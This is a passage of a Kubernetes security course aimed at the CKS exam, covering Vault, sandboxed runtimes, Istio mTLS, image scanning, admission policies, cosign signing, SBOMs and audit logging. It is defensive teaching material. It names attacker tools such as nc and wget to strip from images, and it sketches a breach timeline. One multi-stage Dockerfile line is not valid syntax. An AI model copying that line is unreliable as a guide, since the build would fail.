20.2 HashiCorp Vault — Enterprise-Grade Secret Management

Vault authenticates pods using their ServiceAccount token, then issues dynamic, short-lived secrets. For example, Vault can generate a new PostgreSQL password for each anihpj pod that auto-expires after 24 hours.

Vault Dynamic Secret Flow for anihpj
  📦 anihpj Pod                    🏦 Vault Server              🗄️ PostgreSQL
  ────────────                    ──────────────              ────────────
  │                               │                           │
  │ 1. Present SA token ────────→ │                           │
  │                               │ 2. Validate token        │
  │                               │    (K8s auth method)     │
  │                               │                           │
  │                               │ 3. Generate new password │
  │                               │    "temp-abc123-24h"     │
  │                               │                           │
  │                               │ 4. CREATE ROLE on PG ──→ │
  │                               │    (with temp password)  │
  │                               │                           │
  │ 5. Return temp creds ◀────── │                           │
  │                               │                           │
  │ 6. Connect to PG ──────────────────────────────────────→ │
  │    (using temp password)                                  │
  │                                                           │
  │ ⏰ 24 hours later: password expires, Vault revokes it    │
  │    Pod must re-authenticate to Vault for new creds        │

20.3 External Secrets Operator (ESO)

ESO syncs secrets from cloud providers (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) into Kubernetes Secrets automatically. You define an ExternalSecret resource, and ESO keeps the K8s Secret in sync with the cloud source.

ExternalSecret for anihpj using AWS Secrets Manager
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: anihpj-db-creds
  namespace: anihpj-prod
spec:
  refreshInterval: 1h            # Auto-sync every hour
  secretStoreRef:
    name: aws-secrets-manager
    kind: SecretStore
  target:
    name: anihpj-db-secret       # Creates this K8s Secret
  data:
  - secretKey: DB_PASSWORD
    remoteRef:
      key: prod/anihpj/database  # AWS Secrets Manager key
      property: password

20.4 Implementing Vault for anihpj

✅ anihpj Vault Integration Plan
  • 🔑 Store Django SECRET_KEY and DB password in Vault KV v2 secrets engine
  • 🔐 Configure Vault Kubernetes auth for the anihpj-sa ServiceAccount
  • 📦 Use Vault Agent Injector sidecar to mount secrets into the pod at /vault/secrets/
  • 🔄 Enable dynamic DB credentials: each pod gets a unique, time-limited PostgreSQL password

Chapter 21: Container Runtime Sandboxing — gVisor and Kata Containers

All containers on a node share the same Linux kernel. A kernel exploit in one container compromises the entire node. Sandboxed runtimes like gVisor and Kata Containers add an isolation layer between the container and the host kernel — dramatically reducing the blast radius of kernel vulnerabilities.

🔴 Advanced⏱️ ~1 hour📖 Concepts🎯 Sandboxing

🎯 What You'll Learn

  • ✅ Why shared kernel is a fundamental security problem
  • ✅ gVisor vs Kata Containers — isolation mechanisms and trade-offs
  • ✅ RuntimeClass — how to select runtimes per-pod in Kubernetes
  • ✅ When to use sandboxed runtimes for anihpj workloads

21.1 The Container Isolation Problem

Traditional containers (runc) share the host kernel. A single kernel exploit — like CVE-2022-0492 (cgroup escape) or Dirty Pipe (CVE-2022-0847) — can break out of ALL containers on that node.

Three Levels of Container Isolation
  🔴 TRADITIONAL (runc)          🟡 gVisor (runsc)           🟢 Kata Containers
  ┌───────────────────┐          ┌───────────────────┐       ┌───────────────────┐
  │ Container (anihpj)│          │ Container (anihpj)│       │ Container (anihpj)│
  │ App + Libraries   │          │ App + Libraries   │       │ App + Libraries   │
  └────────┬──────────┘          └────────┬──────────┘       └────────┬──────────┘
           │ syscalls                      │ syscalls                    │ syscalls
           ▼                               ▼                             ▼
  ┌───────────────────┐          ┌───────────────────┐       ┌───────────────────┐
  │ Linux Kernel      │          │ Sentry (user-space│       │ Lightweight VM    │
  │ SHARED by ALL     │          │ kernel emulator)  │       │ OWN kernel per pod│
  │ containers on node│          └────────┬──────────┘       └────────┬──────────┘
  └───────────────────┘                   │ minimal syscalls            │ hypervisor
  🔴 Kernel exploit =                     ▼                             ▼
     ALL containers broken         ┌───────────────────┐       ┌───────────────────┐
                                   │ Linux Kernel      │       │ Linux Kernel      │
                                   │ (limited surface) │       │ (isolated)        │
                                   └───────────────────┘       └───────────────────┘
                                   🟡 Kernel exploit =         🟢 Kernel exploit =
                                      unlikely to escape          pod kernel only

21.2 RuntimeClass — Selecting the Runtime in Kubernetes

RuntimeClass lets you specify which container runtime to use per pod. Different workloads in the same cluster can use different runtimes.

Traditional runc — Shared Kernel, No Isolation

runc is the default OCI runtime used by containerd and CRI-O. Containers share the host kernel directly. Fastest performance but zero isolation between containers at the kernel level. A kernel exploit compromises all containers on the node.

gVisor (runsc) — User-Space Kernel, ~10% Overhead

gVisor's runsc intercepts container syscalls in userspace through a component called Sentry. The container never talks directly to the host kernel — all syscalls are filtered through Sentry's own kernel implementation. Added latency but dramatically reduced attack surface.

Kata Containers — Lightweight VM, ~20% Overhead

Kata runs each container in its own lightweight VM using a hypervisor (QEMU or Firecracker). Each container gets its own kernel — the strongest isolation possible. Higher memory and startup overhead, but the safest option for multi-tenant or untrusted workloads.

Comparison Table — Isolation, Performance, Startup, Memory

Featurerunc (Default)gVisor (runsc)Kata Containers
IsolationNone (shared kernel)User-space kernelLightweight VM
Kernel shared?Yes — all containersPartially (safe syscalls)No — own kernel
PerformanceNative (0% overhead)~10% overhead~20% overhead
Startup timeInstantFast (~ms)Slower (~100ms)
Memory overheadMinimalLowHigher (VM)
Best forTrusted workloadsUntrusted code, generalMulti-tenant, high-security
RuntimeClass + Pod for gVisor
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata: {name: gvisor}
handler: runsc
---
apiVersion: v1
kind: Pod
metadata: {name: anihpj-sandboxed}
spec:
  runtimeClassName: gvisor        # ← Select gVisor for this pod
  containers:
  - name: anihpj
    image: anihpj:v2

21.3 When to Use Sandboxed Runtimes

Decision Flowchart — Which Runtime for Which Workload?

Is this container running untrusted user code or uploads?
YES → gVisor (fast) or Kata (max security)NO ↓
Is this a multi-tenant cluster (different customers)?
YES → Kata Containers (hardware isolation per tenant)NO ↓
Is this a system/privileged workload (CNI, monitoring)?
YES → runc (needs full syscall access)NO ↓
→ Standard business workload (like anihpj Django)
runc + Seccomp + AppArmor is sufficient. Sandboxed runtimes are optional extra protection.

anihpj Recommendation: Standard Runtime + Seccomp + AppArmor

For anihpj, the standard runc runtime combined with Seccomp (RuntimeDefault profile) and AppArmor provides excellent security with zero performance overhead. Sandboxed runtimes (gVisor/Kata) are an option for the media-processing container that handles user file uploads — this is where untrusted content enters the system.

Chapter 22: mTLS and Service Mesh Security

Pod-to-pod traffic inside Kubernetes is plaintext HTTP by default. An attacker who compromises one pod can sniff all inter-service communication. Mutual TLS (mTLS) encrypts all pod-to-pod traffic and verifies both sides' identity — ensuring that only authorized pods can communicate.

🔴 Advanced⏱️ ~1 hour📖 Concepts🎯 mTLS

🎯 What You'll Learn

  • ✅ Why pod-to-pod traffic is insecure by default
  • ✅ How mTLS works — client AND server both present certificates
  • ✅ How Istio service mesh automates mTLS with zero code changes
  • ✅ PeerAuthentication and AuthorizationPolicy for fine-grained control
🎓 CKS Relevance
Minimize Microservice Vulns 20%

22.1 Why Pod-to-Pod Traffic Is Insecure by Default

Without mTLS vs With mTLS
  ❌ WITHOUT mTLS (Default)              ✅ WITH mTLS (Istio/Consul/Linkerd)
  ────────────────────────              ─────────────────────────────────
  
  anihpj ──── plaintext HTTP ────▶ PG   anihpj ──── TLS encrypted ────▶ PG
            "SELECT * FROM users"                   "a7f3b9c1..." (encrypted)
  
  Attacker pod:                          Attacker pod:
  → Can sniff DB queries ✅              → Sees garbage (encrypted) ❌
  → Can see passwords in transit ✅      → Cannot read DB queries ❌
  → Can impersonate anihpj ✅            → No valid cert → REFUSED ❌

22.2 Mutual TLS (mTLS) — How It Works

In regular TLS, only the server proves its identity (your browser verifies the website). In mTLS, both sides prove their identity — the client sends a certificate too. If either certificate is invalid, the connection is refused.

mTLS Handshake — 7-Step Certificate Exchange

anihpj → PostgreSQL mTLS Step by Step
  📦 anihpj (client)                          🗄️ postgres (server)
  ─────────────────                          ───────────────────
  │                                           │
  │ 1. ClientHello ────────────────────────→ │
  │                                           │
  │ 2. ←────────── ServerHello + Server Cert  │
  │                                           │
  │ 3. Verify postgres cert ✓                │
  │    (signed by Istio cluster CA)          │
  │                                           │
  │ 4. ←───── CertificateRequest (client!)   │
  │                                           │
  │ 5. Send anihpj cert ───────────────────→ │
  │                                           │
  │                         6. Verify anihpj │
  │                            cert ✓         │
  │                                           │
  │ 7. ✅ Encrypted channel established!     │
  │ ◀═══════════ TLS 1.3 ════════════════▶  │

Regular TLS vs mTLS — Key Difference

Regular TLS (HTTPS)

Only the server proves its identity. The client is anonymous — any browser can connect to a website. The server knows it's communicating with someone, but not WHO.

mTLS (Pod-to-Pod)

BOTH sides prove their identity. The client must present a valid certificate signed by the cluster CA. Unauthorized pods without valid certs are REFUSED at the TLS layer.

mTLS for anihpj → postgres — Connection Secured

With Istio mTLS enabled, every anihpj-to-postgres connection is automatically encrypted AND authenticated. If an attacker deploys a rogue pod and tries to connect to postgres:5432, Istio's sidecar proxy checks the pod's certificate — since the attacker's pod doesn't have a valid cert signed by the Istio CA, the connection is refused at the TLS handshake (step 5). The postgres pod never even sees the connection attempt.

22.3 Istio — Service Mesh for Automatic mTLS

Istio injects an Envoy sidecar proxy into every pod. The sidecar handles all mTLS automatically — your application code doesn't change at all. You configure mTLS via PeerAuthentication resources.

Istio PeerAuthentication — Enforce mTLS for anihpj
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: anihpj-mtls
  namespace: anihpj-prod
spec:
  mtls:
    mode: STRICT          # ALL traffic must be mTLS
📖 mTLS + NetworkPolicy = Complete Network Security

NetworkPolicy controls who can connect (IP/namespace/label based). mTLS verifies identity (certificate based) and encrypts the traffic. Together: authentication + authorization + encryption. This is the gold standard for pod-to-pod security.

🔧 Debugging mTLS Issues on the CKS Exam

Common mTLS Problems and How to Diagnose Them
  • Symptom: Pod can't connect to another pod. Check: kubectl exec <pod> -- curl -v https://<service> — look for "certificate verify failed" (mTLS issue) vs "connection refused" (NetworkPolicy issue)
  • Symptom: Istio sidecar not injected. Check: kubectl get ns <ns> -o yaml | grep istio-injection — must be "enabled"
  • Symptom: mTLS handshake fails. Check: istioctl proxy-config secret <pod> -n <ns> — verifies certs are distributed
  • Symptom: STRICT mode blocking valid traffic. Fix: Check PeerAuthentication resource: kubectl get peerauthentication -A

22.4 Securing anihpj with Istio mTLS

Here's the complete Istio configuration to secure all anihpj pod-to-pod communication with mTLS and fine-grained access control:

Step 1: Enforce mTLS Globally in the Namespace

Istio PeerAuthentication — Namespace-wide STRICT mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: anihpj-prod
spec:
  mtls:
    mode: STRICT
# Every pod in anihpj-prod MUST present a valid Istio cert

Step 2: Control Which Services Can Talk to Which

Istio AuthorizationPolicy — anihpj → PostgreSQL
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: postgres-access
  namespace: anihpj-prod
spec:
  selector:
    matchLabels:
      app: postgres           # Applies to PostgreSQL pods
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/anihpj-prod/sa/anihpj-sa"]
    to:
    - operation:
        ports: ["5432"]       # Only PostgreSQL port
# Only anihpj-sa can reach PostgreSQL. Everything else DENIED.
✅ What Istio mTLS Gives anihpj
  • ✅ All pod-to-pod traffic encrypted — no plaintext anywhere in the mesh
  • ✅ Identity-based access control — not just IP labels (which can be spoofed)
  • ✅ Automatic certificate rotation — Istio renews certs before expiry
  • ✅ Zero code changes — sidecar proxies handle everything transparently
  • ✅ Attacker pod without valid cert → REFUSED at TLS handshake

Chapter 23: Image Security — Scanning & Minimizing Attack Surface

Container images contain everything: OS, runtime, libraries, your code. A single vulnerable package in your base image can compromise your entire application. This chapter teaches you to scan images for CVEs with Trivy, minimize attack surface with minimal base images, and control image sources with private registries.

🔴 Advanced⏱️ ~2 hours🔧 Hands-On🎯 Image Security

🎯 What You'll Learn

  • ✅ Why container images are a massive security risk — CVEs in base images
  • ✅ How to scan images with Trivy and interpret CVE severity
  • ✅ How to minimize image attack surface with minimal base images
  • ✅ How to enforce private registries and block untrusted image sources
🎓 CKS Relevance
Supply Chain Security 20%

23.1 Why Container Images Are a Security Risk

A container image is a snapshot of an entire filesystem. Every package has potential vulnerabilities. Images built months ago may have CVEs that didn't exist at build time.

🩺 Image CVE Example — anihpj:v1 (Built 6 Months Ago)
  $ trivy image anihpj:v1
  Total: 23 vulnerabilities
  ┌──────────────────────────────────────────────────────────┐
  │ CRITICAL: 2 │ HIGH: 8 │ MEDIUM: 13 │ LOW: 0            │
  └──────────────────────────────────────────────────────────┘
  🔴 CVE-2023-38545  CRITICAL (CVSS 9.8)  curl/libcurl
     → Remote code execution via SOCKS5 proxy
  🔴 CVE-2023-4911   HIGH (CVSS 7.8)     glibc (Looney Tunables)
     → Local privilege escalation via GLIBC_TUNABLES
  ✅ Fix: rebuild with python:3.12-slim → CRITICAL: 0

📦 The Supply Chain Analogy — Your Image Is a Delivery Package

How Vulnerabilities Enter Your Supply Chain
   🏭 FACTORY (Base Image)           📦 WAREHOUSE (Registry)       🏠 YOUR CLUSTER
   ─────────────────────            ──────────────────────        ──────────────
   python:3.10-slim                  anihpj:v1                     Pod running
   ├── curl 7.88 (CVE-2023-38545)    ├── Built 6 months ago       ├── Attacker scans
   ├── glibc 2.36 (CVE-2023-4911)    ├── Never re-scanned          │   for CVEs
   ├── openssl 3.0 (HIGH CVE)        └── "It worked yesterday"    └── Exploits curl CVE
   └── 20+ other packages                                        → RCE in container 💀
   
   🛡️  THE FIX — Scan at EVERY stage:
   ─────────────────────────────────
   ✅ Dev time: trivy fs (scan source dependencies)
   ✅ Build time: trivy image (scan built image)
   ✅ Registry: continuous scanning (Trivy Operator)
   ✅ Admission: Kyverno verifyImages (block unsigned/unscanned)
   ✅ Runtime: Falco (detect exploitation attempts)

23.2 Minimizing Image Attack Surface

Base Image Comparison — distroless vs alpine vs slim

Distroless images from Google contain ONLY your app and its runtime dependencies — no shell, no package manager, no curl, no bash. An attacker who gets code execution in a distroless container can't even run ls. This is the gold standard for minimizing attack surface.

Base ImageSizeShell?Pkg Mgr?CVEsBest For
python:3.121.0 GB✅ bash✅ aptManyDev only
python:3.12-slim130 MB✅ bash✅ aptLessGeneral prod
python:3.12-alpine22 MB✅ sh✅ apkMinimalPreferred
gcr.io/distroless20 MB❌ None❌ NoneVery fewMax security

Multi-Stage Builds — Compile vs Runtime

# Stage 1: BUILDER (has gcc, make — NOT in final image)
FROM python:3.12-slim AS builder
RUN apt-get update && apt-get install -y build-essential
COPY requirements.txt . && RUN pip install --user -r requirements.txt
# Stage 2: RUNTIME (minimal — no build tools, no shell tools)
FROM python:3.12-slim
COPY --from=builder /root/.local /root/.local
COPY . /app
USER 1000

Remove Unnecessary Tools

  • ❌ Remove: curl, wget, bash, nc, git, ssh, telnet — attacker's toolkit
  • ✅ Keep only: app runtime + required libraries
  • ✅ distroless: no shell at all — maximum reduction

23.3 Trivy — Image Vulnerability Scanner

trivy image anihpj:v1                    # Scan image
trivy image --severity CRITICAL --exit-code 1 anihpj:v1  # CI gate
trivy fs /path/to/app                    # Scan filesystem
trivy image --format json -o report.json anihpj:v1       # JSON output

23.4 Private Container Registries — Controlling Image Sources

kubectl create secret docker-registry regcred \
  --docker-server=registry.anihpj.com \
  --docker-username=bot --docker-password=<token> -n anihpj-prod
spec:
  imagePullSecrets: [{name: regcred}]
  containers:
  - image: registry.anihpj.com/anihpj:v2   # Only from our registry

Chapter 24: Admission Controllers & Image Policy Webhook

Admission controllers are the final gate before a resource is persisted. They run AFTER authentication and authorization. OPA Gatekeeper and Kyverno implement policy-as-code — blocking non-compliant resources before they reach the cluster.

🔴 Advanced⏱️ ~2 hours🔧 Hands-On🎯 Admission
🎓 CKS Relevance
Supply Chain Security 20%

24.1 What Are Admission Controllers?

Critical Admission Controllers for CKS

PluginTypeWhat It Does
NodeRestrictionValidatingLimits kubelet access to own node/pods only — blocks node-based attacks
PodSecurityValidatingEnforces Pod Security Standards (PSS) at namespace level
LimitRangerValidatingEnforces resource limits (CPU/Memory) in namespaces — prevents DoS
ResourceQuotaValidatingEnforces namespace resource quotas — prevents runaway resource usage
ServiceAccountMutatingAuto-assigns default ServiceAccount + mounts token volume
MutatingAdmissionWebhookMutatingCustom webhook — modifies requests (add defaults, inject sidecars)
ValidatingAdmissionWebhookValidatingCustom webhook — allow/deny (OPA Gatekeeper, Kyverno)
ImagePolicyWebhookValidatingExternal image approval — deny images from unapproved sources

Mutating vs Validating Webhooks

🔄 Mutating (Runs First)

Modifies the request before persistence. Example: add default securityContext, inject Istio sidecar, set resource limits.

✅ Validating (Runs Second)

Accepts/rejects the mutated request. Example: deny non-approved images, require runAsNonRoot, block hostPath mounts.

24.2 Dynamic Admission Control — Webhooks

Admission Webhook Request Flow
  kubectl apply ──→ API Server ──→ AuthN ✅ ──→ AuthZ ✅
                                        │
                          ┌─────────────┴─────────────┐
                          ▼                           ▼
                   Mutating Webhooks          Validating Webhooks
                   (modify request)           (allow/deny request)
                          │                           │
                          ▼                           ▼
                   Modified object              ✅ Allowed → etcd
                                               ❌ Denied → 403 Forbidden
ValidatingWebhookConfiguration — OPA Gatekeeper
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata: {name: gatekeeper-validating-webhook}
webhooks:
- name: validation.gatekeeper.sh
  rules:
  - operations: ["CREATE","UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  clientConfig:
    service:
      name: gatekeeper-webhook-service
      namespace: gatekeeper-system
    caBundle: <base64-encoded-ca-cert>
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore

24.3 OPA Gatekeeper — Policy as Code for Kubernetes

# ConstraintTemplate: deny non-approved images
package k8srequiredregistry
violation[{"msg": msg}] {
  container := input.review.object.spec.containers[_]
  not startswith(container.image, "registry.anihpj.com/")
  msg := sprintf("image %v not from approved registry", [container.image])
}
Constraint — Apply the template to anihpj namespace
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredRegistry
metadata: {name: require-anihpj-registry}
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["anihpj-prod", "anihpj-dev"]

24.4 Kyverno — Simpler Kubernetes-Native Policies

OPA Gatekeeper vs Kyverno Comparison

FeatureOPA GatekeeperKyverno
Policy languageRego (declarative)YAML (K8s-native)
Learning curveSteepEasy (just YAML)
Image verificationExternal webhookBuilt-in verifyImages
CKS examKnow Rego basicsKnow YAML structure

Admission Control Flow — Complete Pipeline

Kyverno: require image digest + require securityContext
# Policy 1: Require image digest (not :latest)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: require-image-digest}
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-digest
    match: {resources: {kinds: [Pod]}}
    validate:
      message: "Images must use digest, not tags"
      pattern:
        spec:
          containers:
          - image: "*@sha256:*"
---
# Policy 2: Require securityContext on all pods
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: require-security-context}
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-security-context
    match: {resources: {kinds: [Pod]}}
    validate:
      message: "securityContext.runAsNonRoot must be true"
      pattern:
        spec:
          securityContext:
            runAsNonRoot: true
          containers:
          - securityContext:
              allowPrivilegeEscalation: false
🎯 CKS Exam Tip — Admission Controller Ordering

The CKS exam expects you to know the pipeline order: AuthN → AuthZ → Mutating Admission → Validating Admission → etcd. A common trick question: "If a mutating webhook adds runAsNonRoot: true, but a validating webhook checks it BEFORE mutation — what happens?" Answer: validating webhooks run AFTER mutation, so the mutated value IS checked. Know this order cold — it determines whether policies fire on the original or mutated request.

Shift security LEFT — catch misconfigurations at development time, not in production. kube-linter, kubesec, and conftest scan Kubernetes YAML for security issues before they reach the cluster.

🔴 Advanced⏱️ ~1.5 hours🔧 Hands-On🎯 Static Analysis
🎓 CKS Relevance
Supply Chain Security 20%

25.1 Why Static Analysis of YAML Matters

Shift Left — Catch Issues at Dev Time, Not Prod
  👨‍💻 Dev writes YAML → 🔍 Static Analysis → 🏗️ Build → ☸️ Deploy → 🛡️ Admission
       │                    │                                              │
       │              ✅ Catch here!                                ❌ Too late!
       │              (minutes to fix)                            (incident response)
       
  Tools: kube-linter (misconfigs), kubesec (risk score), conftest (custom Rego)

25.2 kube-linter — Kubernetes YAML Security Analysis

# Scan anihpj manifests
kube-linter lint k8s/
# → Checks: root containers, missing resource limits, missing probes, privileged mode

# Example output:
# deployment.yaml: container "anihpj" is running as root
# deployment.yaml: container "anihpj" has no CPU/memory limits
# ⚠️ 2 issues found

25.3 kubesec — Security Risk Analysis for Manifests

# Score your manifest (0-10)
kubesec scan deployment.yaml
# Score: 3/10 → needs improvement
# Critical: container runs as root
# Critical: no seccomp profile
# Critical: no readOnlyRootFilesystem

kubesec scan anihpj-hardened.yaml
# Score: 8/10 ✅

25.4 conftest — Testing YAML with OPA Rego Policies

# policy/security.rego — deny pods without securityContext
package main
deny[msg] {
  input.kind == "Pod"
  not input.spec.securityContext.runAsNonRoot
  msg := "Pod must have runAsNonRoot: true"
}
conftest test deployment.yaml --policy policy/
# FAIL: Pod must have runAsNonRoot: true

25.5 Integrating Static Analysis into anihpj CI/CD

Gate 1: YAML Security

kube-linter + kubesec (score ≥ 4) + conftest on every PR. Fail if critical issues found.

Gate 2: Dockerfile Security

hadolint checks Dockerfile best practices. No COPY . . without .dockerignore. USER must be non-root.

Gate 3: Image Scan

Trivy scans built image. CRITICAL CVEs = 0. HIGH CVEs ≤ 2 with documented exceptions.

Gate 4: Image Signing

cosign signs the image after all gates pass. Only signed images reach the cluster (Ch 26).

anihpj CI/CD Security Pipeline — 4 Gates
  📝 PR Open → 🔍 Gate 1: YAML lint → 🐳 Gate 2: Dockerfile → 🩺 Gate 3: Trivy → 🔏 Gate 4: cosign → ☸️ Deploy

Chapter 26: Image Signing — Cosign and Sigstore

How do you KNOW the image running in production is the exact one your CI pipeline built — and not one an attacker swapped? Cosign signs images cryptographically. Kyverno verifies signatures at admission time. This closes the supply chain loop.

🔴 Advanced⏱️ ~1.5 hours🔧 Hands-On🎯 cosign
🎓 CKS Relevance
Supply Chain Security 20%

26.1 Why Image Signing Matters

Without signing, anyone who gains access to your registry can push a malicious image with the same tag. Signing cryptographically proves: "This image was built by OUR CI pipeline, at THIS commit, and hasn't been tampered with."

☀️ The SolarWinds Lesson — When Trusted Software Becomes Malware

SolarWinds (2020) — Why Image Signing Is Non-Negotiable
   🔴 THE SOLARWINDS ATTACK (2020) — What Happened:
   ─────────────────────────────────────────────────
   1. Attackers compromised SolarWinds' build system
   2. Injected malicious code into the Orion software update
   3. SolarWinds digitally SIGNED the compromised update
   4. 18,000+ organizations deployed it — including US gov agencies
   5. The SIGNATURE was valid! The CODE was not!
   
   🔴 THE KUBERNETES EQUIVALENT — What Could Happen Without Cosign:
   ─────────────────────────────────────────────────────────────
   1. Attacker compromises your CI/CD pipeline (GitHub Actions token leak)
   2. Pushes malicious anihpj:v2.1 to your registry
   3. Tag looks legitimate: "anihpj:v2.1" — same tag pattern
   4. No signature verification at admission → pod starts
   5. Malicious container steals DB credentials, exfiltrates user data 💀
   
   ✅ WITH COSIGN — How Signature Verification Stops This:
   ─────────────────────────────────────────────────────
   1. CI pipeline builds + pushes image
   2. CI pipeline signs image with cosign (private key in HSM/Vault)
   3. Kyverno verifyImages checks signature at admission time
   4. Attacker pushes malicious image → no valid cosign signature
   5. Kyverno REJECTS: "image signature verification failed" 🛡️
   
   🔑 Key Difference from SolarWinds:
      SolarWinds: Code was signed BY the attacker (they owned the build)
      Cosign: Private key is NOT in the CI pipeline — it's in a KMS/HSM
      → Even if CI/CD is compromised, attacker can't sign images

26.2 Cosign — Signing and Verifying Container Images

Cosign Workflow: Build → Push → Sign → Store Signature

# Generate key pair (store private key securely!)
cosign generate-key-pair

# Sign the image after build + push
cosign sign --key cosign.key registry.anihpj.com/anihpj:v2

# Verify signature before deployment
cosign verify --key cosign.pub registry.anihpj.com/anihpj:v2
# ✅ Verification succeeded

Key-Based Signing

cosign generate-key-pair creates a public/private key pair. The private key signs; the public key verifies. Store the private key in a secure location (KMS, Vault, or hardware token).

Verification at Admission Time

Kyverno can verify cosign signatures at admission — rejecting unsigned images before they reach the cluster.

26.3 Kyverno verifyImages — Enforcing Signed Images

apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: verify-anihpj-images}
spec:
  validationFailureAction: Enforce
  rules:
  - name: verify-cosign-signature
    match: {resources: {kinds: [Pod]}}
    verifyImages:
    - imageReferences: ["registry.anihpj.com/*"]
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              ...your-cosign-public-key...
              -----END PUBLIC KEY-----

26.4 Keyless Signing with Sigstore (OIDC-Based)

Sigstore enables keyless signing — instead of managing long-lived keys, cosign uses OIDC (OpenID Connect) to bind your identity (GitHub, Google, Microsoft) to the signature. No private keys to store or rotate.

cosign sign registry.anihpj.com/anihpj:v2
# → Opens browser for OIDC authentication
# → Signature bound to your identity, not a key
GitHub Actions — Keyless Signing
- name: Cosign keyless sign
  uses: sigstore/cosign-installer@v3
  with:
    cosign-release: v2.2.0
- run: |
    cosign sign \
      --yes \
      registry.anihpj.com/anihpj:${{ github.sha }}
  env:
    COSIGN_EXPERIMENTAL: "true"

Chapter 27: SBOM & SLSA — Software Supply Chain Integrity

An SBOM (Software Bill of Materials) lists every component in your image. SLSA (Supply Chain Levels for Software Artifacts) defines a framework for supply chain integrity. Together they answer: "What's in my image?" and "Can I trust how it was built?"

🔴 Advanced⏱️ ~1 hour📖 Concepts🎯 SBOM/SLSA
🎓 CKS Relevance
Supply Chain Security 20%

27.1 What Is an SBOM and Why Does It Matter?

An SBOM is like a nutrition label for your container image — it lists every package, library, and dependency inside. When a new CVE is announced, query your SBOM to instantly know if you're affected.

🔥 The Log4Shell Scenario — Why SBOMs Save Hours of Panic

December 2021: Log4Shell (CVE-2021-44228) — CVSS 10.0
   ❌ WITHOUT SBOM:                         ✅ WITH SBOM:
   ───────────────                          ────────────
   09:00 CVE published                      09:00 CVE published
   09:05 "Do we use Log4j?!"               09:05 grep -r "log4j" sboms/
   09:30 Start scanning 200 images...      09:06 → 3 matches found
   13:00 Still scanning...                 09:07 → Teams notified
   15:00 Found! Patching now.             09:10 → Patching begins
   ⏱️  6 HOURS of uncertainty               ⏱️  5 MINUTES — SBOM saves the day
syft registry.anihpj.com/anihpj:v2 -o spdx-json > anihpj-sbom.json

27.2 Generating SBOMs for anihpj Images

Tools: syft (generate SBOM from image), grype (scan SBOM for CVEs), cosign attest (attach SBOM to image signature). Integrate into CI/CD to generate SBOM on every build.

# Generate SBOM with syft
syft registry.anihpj.com/anihpj:v2 -o cyclonedx-json > anihpj-v2.sbom.json
# Lists: Python 3.12.0, Django 5.0, gunicorn 21.2, Pillow 10.3, etc.

# Attach SBOM to image using cosign attest
cosign attest --predicate anihpj-v2.sbom.json \
  --type cyclonedx registry.anihpj.com/anihpj:v2
# → SBOM is now cryptographically linked to the image signature

27.3 SLSA — Supply Chain Levels for Software Artifacts

SLSA defines 4 levels of supply chain integrity:

LevelNameRequirements
SLSA 1Build existsAutomated build with provenance generation
SLSA 2Tamper-resistantVersion control + build service with audit logs
SLSA 3AuditableNon-falsifiable provenance + isolated builds
SLSA 4HermeticTwo-person review + reproducible builds
📖 CKS Exam: SBOM & SLSA Awareness

For the CKS exam, know what SBOM and SLSA are conceptually. Understand that syft generates SBOMs, cosign can attach them to images, and SLSA levels represent increasing supply chain integrity. Deep implementation details are not tested — but supply chain reasoning is.

🔴 Part 7: Monitoring & Runtime SecurityChapters 28-32

Chapter 28: Kubernetes Audit Logging — Every API Call Recorded

Audit logging records every request to the Kubernetes API — who made it, what they did, when, and from where. Without audit logs, you cannot prove what happened during a security incident. Required by PCI-DSS, SOC 2, HIPAA, and GDPR for cluster environments.

🔴 Advanced⏱️ ~1.5 hours🔧 Hands-On🎯 Audit
🎓 CKS Relevance
Monitoring & Runtime Security 20%

28.1 What Is Audit Logging and Why Is It Non-Negotiable?

An audit log is a chronological, tamper-proof record of every API request. It captures: who (user/SA), what (verb + resource), when (timestamp), from where (IP), and the result (allowed/denied). Without it, a security incident is a mystery with no answers.

How Audit Logs Tell the Story of an Attack
  ⏰ TIMELINE OF A BREACH — Reconstructed from Audit Logs:
  
  03:14:22 — user=attacker-sa verb=get resource=secrets namespace=anihpj-prod
             → Attacker reads database credentials
  
  03:14:45 — user=attacker-sa verb=create resource=pods namespace=anihpj-prod
             → Attacker creates a backdoor pod
  
  03:15:10 — user=attacker-sa verb=create resource=clusterrolebindings
             → Attacker creates persistent admin access
  
  03:16:00 — user=attacker-sa verb=delete resource=deployments
             → Attacker deletes the anihpj deployment
  
  WITHOUT audit logs: "Something deleted our deployment at 3 AM. Who? How?"
  WITH audit logs: Above timeline — every action, timestamp, and user. 🔍

28.2 Configuring an Audit Policy (CKS Exam — Must Know)

/etc/kubernetes/audit-policy.yaml — CKS Ready
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Don't log noisy system/node health checks
- level: None
  users: ["system:kube-proxy", "system:nodes"]
  verbs: ["get", "list", "watch"]
# Log secret reads at Metadata (NOT the values!)
- level: Metadata
  resources: [{group: "", resources: ["secrets", "configmaps"]}]
# Log pod create/update/delete fully
- level: RequestResponse
  resources: [{group: "", resources: ["pods"]}]
  verbs: ["create", "update", "delete"]
# Log cluster-admin actions
- level: RequestResponse
  userGroups: ["system:masters"]
# Default: log everything else at Metadata level
- level: Metadata

28.3 Reading and Analyzing Audit Logs

# Find all secret access in the last hour
cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.resource=="secrets")'

# Find pod/exec events (someone got a shell!)
